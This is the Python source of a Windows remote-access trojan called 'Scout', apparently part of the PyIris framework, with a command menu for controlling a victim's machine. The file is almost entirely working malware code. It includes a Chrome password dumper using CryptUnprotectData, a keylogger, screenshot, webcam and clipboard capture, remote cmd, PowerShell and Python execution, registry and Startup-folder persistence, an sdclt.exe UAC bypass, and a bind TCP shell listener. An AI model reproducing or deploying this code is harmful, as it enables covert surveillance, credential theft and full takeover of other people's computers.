import pyHook
import webbrowser
import mss.tools
import ctypes
import pyautogui
import sys
import socket
import os
import sqlite3
import cv2
import threading
import pickle
import pyperclip
import pythoncom
import mss
import winreg
from urllib.request import urlopen, unquote
from win32api import RegOpenKeyEx, RegSetValueEx
from base64 import b64decode, b64encode
from time import sleep, gmtime, strftime
from win32gui import SystemParametersInfo
from platform import uname, win32_ver
from os import getpid, path, startfile, path, getcwd, startfile, getcwd, path, chdir, _exit
from sys import argv
from locale import getdefaultlocale
from io import BytesIO, StringIO
from datetime import datetime
from shutil import copy
from subprocess import check_output, Popen, PIPE
from win32con import HKEY_CURRENT_USER, KEY_SET_VALUE, REG_SZ, SPI_SETDESKWALLPAPER
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
from PIL import Image
from getpass import getuser
from ctypes import windll, Structure, windll, c_uint, sizeof, byref
from comtypes import CLSCTX_ALL
from win32crypt import CryptUnprotectData

help_menu = '''
Scout Help Menu
===============
   Base Commands :
      disconnect                              Disconnects the scout
      help                                    Show the help menu or help for specific command, alias of the command is "?"
      kill                                    Kills the scout
      ping                                    Ping the scout
      sleep                                   Make the scout disconnect and sleep for a specified amount of time

   Scout Commands :
      active                                  Shows all open windows on the target system
      admin                                   Checks to see if the scout is running as a process with admin privileges
      browse <site>                           Opens a new browser to the specified site
      chromedump ["active"|"passive"]         Dumps chrome passwords. If "active" kills chrome.exe first, if "passive" will not run if chrome.exe is running
      clip_clear                              Clear the clipboard data on the target system
      clip_dump                               Display contents of clipboard on the target system
      clip_set <text to set clipboard to>     Set the value of the clipboard on the target system
      download <Remote file path>             Remotely download a file to local current working directory of PyIris
      download_web <url> <Remote file path>   Allows you to download a file from a url supplied to a specified remote file path
      exec_c <shell command>                  A remote shell command execution component of the scout, it allows the scout to remotely execute commands using cmd.exe
      exec_f <Remote file path>               Will open and execute any file that is specified as the argument
      exec_p <shell command>                  A remote shell command execution component of the scout, it allows the scout to remotely execute commands using powershell.exe
      exec_py <python command>                Execute in-memory arbitrary python code on the target system
      exec_py_file <Local file path>          Execute arbitrary python code from a file to execute on the target system in-memory
      exec_py_script                          Script in the terminal a block of in-memory arbitrary python code to execute on the target system
      idle                                    Get amount of time user has not pressed a key or moved mouse/ get the idle time of system
      inj_h <hotkey combination to inject>    Inject a hotkey combination through keystrokes that mimic button presses
      inj_p <button to inject as a press>     Inject a single key press through keystrokes that mimic button presses
      inj_t <string to inject as typing>      Inject a string through keystrokes that mimic typing
      inj_valid                               List all the valid keys the user can inject into the victim
      inter_lock <key/mouse>                  Disable the keyboard or mouse interface
      inter_unlock <key/mouse>                Enable the keyboard or mouse interface
      key_dump                                Dump the captured in-memory keystrokes
      key_start                               Start the keylogger
      key_stop                                Stop the keylogger
      lock                                    Allows you to gracefully lock the target system
      logout                                  Allows you to gracefully log the user out of the target system
      reg_persist                             This module creates a new key in the HKCU\Software\Microsoft\Windows\CurrentVersion\Run registry path
      restart                                 Allows you to gracefully restart the target system
      screen                                  Takes a screenshot and saves it to in memory file before sending the in memory file to PyIris to download
      sdclt_uac <full remote filepath>        Bypasses UAC by using the sdclt.exe process
      set_audio <number>                      Set system wide audio level by decibel
      set_audio_range                         Get range of valid system wide audio level by decibel
      shutdown                                Allows you to gracefully shutdown the target system
      startup_persist                         This module copies the scout to the windows startup folder
      sysinfo                                 Grabs system info and displays it
      upload <Local file path>                Remotely upload a file to remote current working directory of scout
      wallpaper <Remote path of picture>      Set the targets wallpaper to a specified image file on the remote system
      webcam                                  Snaps a picture from the webcam and saves it as an in memory pickle before sending it to PyIris to decode and download
'''
keylock = False
mouselock = False
active_logger = False
keylog = ""
window = ""
   
def download_web(command):
    url = command.split(' ')[1]
    file_name = command.split(' ')[2]
    response = urlopen(url)
    url_data = response.read()
    f = open(file_name, 'wb')
    f.write(url_data)
    f.close()
    main_send('[+]Downloaded : ' + url + ' -> ' + file_name, s)

def admin():
    main_send('[*]Scout is running with admin privileges : ' + str(windll.shell32.IsUserAnAdmin() != 0), s)

def exec_p(execute):
    execute = execute.split(' ',1)[1]
    if execute[:3] == 'cd ':
        execute = execute.replace('cd ', '', 1)
        chdir(execute)
        main_send("[+]Changed to directory : " + execute, s)
    else:
        result = Popen('powershell.exe ' + execute, shell=True, stdout=PIPE, stderr=PIPE,
                       stdin=PIPE)
        result = result.stdout.read() + result.stderr.read()
        main_send('[+]Command output : \n' + result.decode())

def screen():
    with mss.mss() as sct:
        monitor = sct.monitors[1]
        im = sct.grab(monitor)
        raw_bytes = mss.tools.to_png(im.rgb, im.size)
        main_send(raw_bytes, s)

def chromedump(arg):
    arg = arg.split(' ', 1)[1]
    msg = ''
    if arg == 'active':
        Popen('taskkill /f /im chrome.exe', shell=True, stdout=PIPE, stderr=PIPE, stdin=PIPE)
        msg += '[+]Killed chrome process'
    elif arg == 'passive':
        if 'chrome.exe'.encode() in check_output(['tasklist']):
            main_send('[-]Chrome is currently running, this module will not do anything until chrome stops', s)
            return
    else:
        raise IndexError
        return
    info_list = []
    connection = sqlite3.connect(os.getenv('localappdata') + '\\Google\\Chrome\\User Data\\Default\\' + 'Login Data')
    with connection:
        cursor = connection.cursor()
        v = cursor.execute(
            'SELECT action_url, username_value, password_value FROM logins')
        value = v.fetchall()
    for origin_url, username, password in value:    
        password = CryptUnprotectData(
            password, None, None, None, 0)[1]
        if password:
            info_list.append({
                'origin_url': origin_url,
                'username': username,
                'password': str(password)
            })
    msg += '\n[*]Dumped passwords : '
    if not info_list:
        msg += '\n[-]No passwords present'
    else:
        for i in info_list:
            msg += '\n   [+]Username : ' + i['username'].encode('ascii','ignore').decode()
            msg += '\n      URL      : ' + i['origin_url'].encode('ascii','ignore').decode()
            msg += '\n      Password : ' + i['password'].encode('ascii','ignore').decode()
    main_send(msg, s)

def system_stat(option):
    if option == 'lock':
        main_send('[*]Locking user...', s)
        windll.user32.LockWorkStation()
    elif option == 'logout':
        main_send('[*]Logging user out...', s)
        os.system('shutdown /l')
    elif option == 'restart':
        main_send('[*]System restarting...', s)
        os.system('shutdown /r /t 0')
    elif option == 'shutdown':
        main_send('[*]System shutting down...', s)
        os.system('shutdown /s /t 0')

def startup_persist(filepath):
        copy(filepath, 'C:\\Users\\' + getuser() + '\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\' + path.basename(argv[0]))
        main_send('[+]Persistence via startup folder achieved', s)

def exec_f(file):
    startfile(file.split(' ',1)[1])
    s.sendall(().encode())
    main_send('[+]Executed : ' + file.split(' ',1)[1], s)

def disable(event):
    return False


def enable(event):
    return True


def key_lock():
    hm = pyHook.HookManager()
    hm.KeyAll = disable
    hm.HookKeyboard()
    while True:
        if not keylock:
            hm = pyHook.HookManager()
            hm.KeyAll = enable
            hm.HookKeyboard()
            return
        pythoncom.PumpWaitingMessages()


def mouse_lock():
    hm = pyHook.HookManager()
    hm.MouseAll = disable
    hm.HookMouse()
    while True:
        if not mouselock:
            hm = pyHook.HookManager()
            hm.MouseAll = enable
            hm.HookMouse()
            return
        pythoncom.PumpWaitingMessages()


def interface_locker(data):
    global keylock
    global mouselock
    if data.split(' ')[0] == 'inter_lock' and data.split(' ')[1] == 'key' and keylock:
        main_send('[-]Keyboard is already locked', s)
    elif data.split(' ')[0] == 'inter_lock' and data.split(' ')[1] == 'mouse' and mouselock:
        main_send('[-]Mouse is already locked', s)
    elif data.split(' ')[0] == 'inter_lock' and data.split(' ')[1] == 'key':
        keylock = True
        t = threading.Thread(target=key_lock,args=(),)
        t.start()
        main_send('[+]Locked keyboard interface', s)
    elif data.split(' ')[0] == 'inter_lock' and data.split(' ')[1] == 'mouse':
        mouselock = True
        t = threading.Thread(target=mouse_lock,args=(),)
        t.start()
        main_send('[+]Locked mouse interface', s)
    elif data.split(' ')[0] == 'inter_unlock' and data.split(' ')[1] == 'key':
        keylock = False
        main_send('[+]Unlocked keyboard interface', s)
    elif data.split(' ')[0] == 'inter_unlock' and data.split(' ')[1] == 'mouse':
        mouselock = False
        main_send('[+]Unlocked mouse interface', s)
    else:
        main_send('[-]Please specify valid interface, key/mouse, to lock/unlock', s)

def wallpaper(data):
    path = data.split(' ',1)[1]
    exec("path = r'" + path + "'")
    key = RegOpenKeyEx(HKEY_CURRENT_USER,"Control Panel\Desktop",0,KEY_SET_VALUE)
    RegSetValueEx(key, "WallpaperStyle", 0, REG_SZ, "0")
    RegSetValueEx(key, "CenterWallpaper", 0, REG_SZ, "0")
    SystemParametersInfo(SPI_SETDESKWALLPAPER, path, 1+2)
    main_send('[+]Set wallpaper to : ' + path, s)


def inject_keystokes(args):
    command = args.split(' ',1)[0]
    injecting = args.split(' ',1)[1]
    if command == "inj_t":
        pyautogui.typewrite(injecting)
        main_send('[+]Injected keystrokes : ' + injecting, s)
    elif command == "inj_h":
        injecting = injecting.split(' ')
        for i in injecting:
            pyautogui.keyDown(i)
        for i in reversed(injecting):
            pyautogui.keyUp(i)
        main_send('[+]Injected hotkeys : ' + ' '.join(injecting), s)
    elif command == "inj_p":
        pyautogui.press(injecting)
        main_send('[+]Injected button press : ' + injecting, s)


def upload(data):
    data = data.split(' ')
    filename = ' '.join(data[1:-1])
    f = open(filename,'wb')
    f.write(b64decode(data[-1]))
    main_send('[+]Successfully wrote uploaded file data', s)

def browse(site):
    site = site.split(' ',1)[1]
    open_bool = webbrowser.open(site)
    if open_bool:
        main_send('[+]Opened site : ' + site, s)
    else:
        main_send('[-]Could not open site : ' + site, s)

def webcam():
    cam = cv2.VideoCapture(0)
    retval, im = cam.read()
    cam.release()
    cv2.destroyAllWindows()
    im = cv2.cvtColor(im, cv2.COLOR_BGR2RGB)
    return im

def download(data):
    filepath = data.split(' ',1)[1]
    with open(filepath,'rb') as f:
        file_data = f.read()
    main_send(filepath + ' ' + b64encode(file_data).decode(), s)

def active():
    global IsWindowVisible
    EnumWindows = ctypes.windll.user32.EnumWindows
    EnumWindowsProc = ctypes.WINFUNCTYPE(ctypes.c_bool, ctypes.POINTER(ctypes.c_int), ctypes.POINTER(ctypes.c_int))
    GetWindowText = ctypes.windll.user32.GetWindowTextW
    GetWindowTextLength = ctypes.windll.user32.GetWindowTextLengthW
    IsWindowVisible = ctypes.windll.user32.IsWindowVisible
    titles = []
    def foreach_window(hwnd, lParam):
        if IsWindowVisible(hwnd):
            length = GetWindowTextLength(hwnd)
            buff = ctypes.create_unicode_buffer(length + 1)
            GetWindowText(hwnd, buff, length + 1)
            titles.append(buff.value)
        return True
    EnumWindows(EnumWindowsProc(foreach_window), 0)    
    encoded = ['\n   - ' + i.encode('ascii','ignore').decode().strip() for i in titles]
    encoded = filter(lambda a: a != '\n   - ', encoded)
    encoded = list(set(encoded))
    data = '[+]All opened windows : \n'
    data += ''.join(encoded)
    main_send(data + "\n", s)

class LASTINPUTINFO(Structure):
    _fields_ = [
        ('cbSize', c_uint),
        ('dwTime', c_uint),
    ]

def idle(data):
    lastInputInfo = LASTINPUTINFO()
    lastInputInfo.cbSize = sizeof(lastInputInfo)
    windll.user32.GetLastInputInfo(byref(lastInputInfo))
    millis = windll.kernel32.GetTickCount() - lastInputInfo.dwTime
    main_send('[+]User has been inactive for : ' + str(millis / 1000.0) + ' seconds', s)

def exec_c(execute):
    execute = execute.split(' ',1)[1]
    if execute[:3] == 'cd ':
        execute = execute.replace('cd ', '', 1)
        chdir(execute)
        main_send("[+]Changed to directory : " + execute, s)
    else:
        result = Popen(execute, shell=True, stdout=PIPE, stderr=PIPE,
                       stdin=PIPE)
        result = result.stdout.read() + result.stderr.read()
        main_send('[+]Command output : \n' + result.decode(), s)

def OnKeyboardEvent(event):
    global window
    global keylog
    sample_space = 'qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM1234567890'
    try:
        letter = event.Key
        if event.WindowName != window:
            keylog += '\n\n<User started typing in new window : ' + event.WindowName + '>\n\n'
            window = event.WindowName
        if letter not in sample_space:
            keylog += '[' + letter + ']'
        else:
            keylog += letter
    except:
        keylog += '[Error Logging Key!]'
    return True

def key(option):
    global active_logger
    global keylog
    if option == 'key_start':
        if active_logger:
            main_send('[-]Keylogger already started', s)
        else:
            hooks_manager = pyHook.HookManager()
            hooks_manager.KeyDown = OnKeyboardEvent
            hooks_manager.HookKeyboard()
            active_logger = not active_logger
            main_send('[+]Activated keylogger', s)
            while True:
                if not active_logger:
                    hooks_manager.UnhookKeyboard()
                    windll.user32.PostQuitMessage(0)
                    return
                else:
                    pythoncom.PumpWaitingMessages()
    elif option == 'key_stop':
        if not active_logger:
            main_send('[-]Keylogger not started', s)
        else:
            active_logger = not active_logger
            main_send('[+]Stopped keylogger', s)
    elif option == 'key_dump':
        main_send('[+]Keylog dump : \n' + keylog + '\n', s)
        keylog = ""

def clip_logger(option):
    flag = option.split(' ',1)
    if flag[0] == 'clip_dump':
        data = pyperclip.paste()
        main_send('[+]Got clipboard data : \n' + data, s)
    elif flag[0] == 'clip_set':
        pyperclip.copy(flag[1])
        main_send('[+]Set clipboard text to : ' + flag[1], s)
    elif flag[0] == 'clip_clear':
        pyperclip.copy('')
        main_send('[+]Cleared clipboard', s)

def registry_persist(path):
    reg = winreg.ConnectRegistry(None,winreg.HKEY_CURRENT_USER)
    key = winreg.CreateKeyEx(reg,'Software\Microsoft\Windows\CurrentVersion\Run',0,winreg.KEY_WRITE)
    winreg.SetValueEx(key, 'Updater',0,winreg.REG_SZ, path)
    winreg.FlushKey(key)
    winreg.CloseKey(key)
    winreg.CloseKey(reg)
    main_send('[+]Persistence via registry achieved', s)

def exec_py(command):
    command = command.split(' ', 1)[1]
    old_stdout = sys.stdout
    result = StringIO()
    sys.stdout = result
    try:
        exec(command)
    except Exception as e:
        result.write(str(e) + '\n')
    sys.stdout = old_stdout
    result_string = result.getvalue()
    main_send('[*]Result of code : \n\n' + result_string, s)


def set_audio_range():        
    devices = AudioUtilities.GetSpeakers()
    interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
    volume = ctypes.cast(interface, ctypes.POINTER(IAudioEndpointVolume))
    range_vol = volume.GetVolumeRange()
    main_send('[*]Max decibel level(100%) : ' + str(range_vol[1]) + '\n[*]Minimum decibel level(0%) : ' + str(range_vol[0]), s)


def set_audio(data):
    number = data.split(' ',1)[1]
    devices = AudioUtilities.GetSpeakers()
    interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
    volume = ctypes.cast(interface, ctypes.POINTER(IAudioEndpointVolume))
    volume.SetMasterVolumeLevel(float(number), None)
    main_send('[+]Set volume to : ' + str(number), s)

def sysinfo():
    platform_uname = uname()
    platform_win32 = win32_ver()
    private_ips = [str(i[4][0]) for i in socket.getaddrinfo(socket.gethostname(), None)]
    data = '[*]System Information : \n'
    data += '   OS             : ' + str(platform_uname[0]) + '\n'
    data += '   Release        : ' + str(platform_uname[2]) + '\n'
    data += '   Exact Version  : ' + str(platform_uname[3]) + '\n'
    data += '   Node Name      : ' + str(platform_uname[1]) + '\n'
    data += '   Machine Type   : ' + str(platform_uname[4]) + '\n'
    data += '   Processor Type : ' + str(platform_uname[5]) + '\n'
    data += '   OS Type        : ' + str(platform_win32[3]) + '\n'
    data += '   Private IPs    : ' + ', '.join(private_ips) + '\n'
    data += '   Process ID     : ' + str(getpid()) + '\n'
    data += '   System time    : ' + str(datetime.now().strftime('%Y-%m-%d %H:%M:%S')) + '\n'
    data += '   Timezone       : ' + str(strftime("%z", gmtime())) + '\n'
    data += '   Language       : ' + str(' '.join(getdefaultlocale())) + '\n'
    main_send(data, s)

def sdclt_uac(data):
    filepath = data.split(' ',1)[1]
    if path.isfile(filepath):
        reg = winreg.ConnectRegistry(None,winreg.HKEY_CURRENT_USER)
        key = winreg.CreateKeyEx(reg,'Software\Classes\Folder\shell\open\command',0,winreg.KEY_WRITE)
        winreg.SetValueEx(key, '',0,winreg.REG_SZ, 'cmd.exe /c "' + filepath + '"')
        winreg.FlushKey(key)
        winreg.SetValueEx(key, 'DelegateExecute',0,winreg.REG_SZ, '')
        winreg.FlushKey(key)
        winreg.CloseKey(key)
        winreg.CloseKey(reg)
        startfile('C:\WINDOWS\system32\sdclt.exe')
        sleep(2)
        winreg.DeleteKey(winreg.OpenKey(winreg.HKEY_CURRENT_USER, 'Software\Classes\Folder\shell\open'), 'command')
        main_send('[+]Attempted to get executable to bypass UAC through sdclt.exe', s)
    else:
        main_send('[-]Executable remote filepath does not exist', s)

comp_list = ['windows/bases/bind_tcp_base', 'windows/control/active_windows_dump', 'windows/control/browser', 'windows/control/check_admin', 'windows/control/chrome_password_dump', 'windows/control/clip_logger', 'windows/control/download_file', 'windows/control/download_web', 'windows/control/execute_command_cmd', 'windows/control/execute_command_powershell', 'windows/control/execute_file', 'windows/control/execute_python', 'windows/control/get_idle', 'windows/control/in_memory_screenshot', 'windows/control/in_memory_webcam', 'windows/control/inject_keystrokes', 'windows/control/interface_lock', 'windows/control/key_and_window_logger', 'windows/control/registry_persistence', 'windows/control/sdclt_uac_bypass', 'windows/control/set_audio', 'windows/control/startup_folder_persistence', 'windows/control/system_info_grabber', 'windows/control/system_status_change', 'windows/control/upload_file', 'windows/control/wallpaper_changer']

def recv_all(sock):
    x = 0  ########## REMOVE WHEN IMPLMENTING ##########
    sock.settimeout(None)
    try:  # encoded bytes that can be decoded to UTF8
        data = sock.recv(1000000)
        processed_data = data.decode()  # Only test for encoding in the first part just so we can take out length bytes if we can .decode() the first segment it doesnt guarantee future segments can be .decoded()
        target_length = int(processed_data.split("|", 1)[
                                0])  # split by seperator to get leading bytes which tell us the length of message
        data = data[len(str(target_length)) + 1:]  # usable data
    except UnicodeDecodeError:  # encoded bytes that cannot be safely converted to UTF8
        target_length = int(data.decode(encoding='utf-8', errors='ignore').split("|", 1)[
                                0])  # split by seperator to get leading bytes which tell us the length of message
        data = data[len(str(target_length)) + 1:]  # usable data

    received_data_length = len(
        data)  # actual received length of usable data we got excluding length of size bytes and seperator
    if received_data_length >= target_length:  # x|data where value x denotes only length of data we take away the bytes that were unaccounted for namely length of x + 1 (the seperator)
        try:
            return data.decode()  # data can be decoded into utf-8
        except UnicodeDecodeError:
            return data  # data cant be decoded indicative of a raw file of sorts

    sock.settimeout(
        3)  # NOTE we disregard byte encoding when obtaining data we only decode at the very end when we have all data we cannot decode and assume for each individual segment
    while received_data_length < target_length:  # we now no longer have to account for the free bytes used at the front but must account for the used bytes should they have been insufficient
        try:
            x += 1  ########## REMOVE THis STATEMENT WHEN ACUTALLY IMPLEMENTING ##########
            print(str(x) + " parts out of " + str(
                target_length / 1000000) + " received, this is a rough progress bar")  ########### REMOVE OR NOT LOL YOU CAN KEEP THE PROGRESS BAR MAYBE TO SHOW USERS ##########
            tmp_data = sock.recv(1000000)
            if not tmp_data:
                raise socket.error
            data += tmp_data
            received_data_length += 1000000
        except (socket.error, socket.timeout):  # in case of network hiccup/ network error disconnect we bail out
            break
    try:
        return data.decode()  # data can be decoded into utf-8
    except UnicodeDecodeError:
        return data  # data cant be decoded indicative of a raw file of sorts

def main_send(data, sock):
    try: # normal utf-8 message that needs to be byte encoded
        sock.sendall((str(len(data)) + "|" + data).encode())
    except TypeError: # raw bytes that are technically alr encoded
        sock.sendall(str(len(data)).encode() + b"|" + data)
        
while True:
    while True:
        try:
            sock = socket.socket()
            sock.settimeout(5)
            sock.bind(('192.168.1.54',9999))
            sock.listen(1)
            s, a = sock.accept()
            s.sendall('t8U%nDPPXHMnHXmSYCvR4BL&waO!tx^sCIetHhLUg6sF$l2kPT'.encode())
            break
        except (socket.timeout,socket.error):
            continue
    while True:
        try:
            data = recv_all(s)
            interface = data.split(' ')[0]
            if interface == "g":
                interface = "GUI"
            elif interface == "c":
                interface = "CUI"
            data = data.split(' ')[1:]
            command = ""
            for command_string in data:
                command = command + command_string + " "
            data = command.strip()
            command = data.split(" ")[0]
            if command == 'kill':
                main_send('[*]Scout is killing itself...', s)
                _exit(1)
            elif command in ('help','?'):
                if interface == "GUI":
                    main_send(pickle.dumps(comp_list), s)
                elif interface == "CUI":
                    main_send(help_menu, s)
            elif command == 'ping':
                main_send('[+]Scout is alive', s)
            elif command == 'sleep':
                length = int(data.split(' ',1)[1])
                main_send('[*]Scout is sleeping...', s)
                for i in range(length):
                    sleep(1)
                break
            elif command == 'disconnect':
                main_send('[*]Scout is disconnecting itself...', s)
                sleep(3)
                break
            elif command == "chromedump":
                chromedump(data)
            elif command == "idle":
                idle(data)
            elif command in ('lock','logout','restart','shutdown'):
                system_stat(command)
            elif command in ('clip_dump', 'clip_set', 'clip_clear'):
                clip_logger(data)
            elif command in ("inj_t","inj_h","inj_p"):
                inject_keystokes(data)
            elif command == "upload":
                upload(data)
            elif command == "startup_persist":
                startup_persist(path.join(getcwd(),path.abspath(argv[0])))
            elif command == "download":
                download(data)
            elif command == "browse":
                browse(data)
            elif command == "screen":
                screen()
            elif command == "admin":
                admin()
            elif command == "sysinfo":
                sysinfo()
            elif command == 'webcam':
                main_send(pickle.dumps(Image.fromarray(webcam())), s)
            elif command == "exec_c":
                exec_c(data)
            elif command == "set_audio_range":
                set_audio_range()
            elif command in ('inter_lock','inter_unlock'):
                interface_locker(data)
            elif command == "wallpaper":
                wallpaper(data)
            elif command == "download_web":
                download_web(data)
            elif command == "active":
                active()
            elif command == "exec_py":
                exec_py(data)
            elif command == "set_audio":
                set_audio(data)
            elif command == "sdclt_uac":
                sdclt_uac(data)
            elif command == "exec_f":
                exec_f(data)
            elif command == "reg_persist":
                registry_persist(path.join(getcwd(),path.abspath(argv[0])))
            elif command in ('key_start','key_stop','key_dump'):
                t = threading.Thread(target=key, args=(data,))
                t.start()
            elif command == "exec_p":
                exec_p(data)
            else:
                main_send('[-]Scout does not have the capability to run this command. (Was it loaded during generation?)', s)
        except (socket.error,socket.timeout) as e:
            try:
                if type(e) not in (ConnectionResetError,socket.timeout):
                    raise e
                s.close()
                break
            except IndexError:
                main_send('[-]Please supply valid arguments for the command you are running', s)
            except Exception as e:
                main_send(('[!]Error in scout : ' + str(e)), s)
        except IndexError:
            main_send('[-]Please supply valid arguments for the command you are running', s)
        except Exception as e:
            main_send(('[!]Error in scout : ' + str(e)), s)
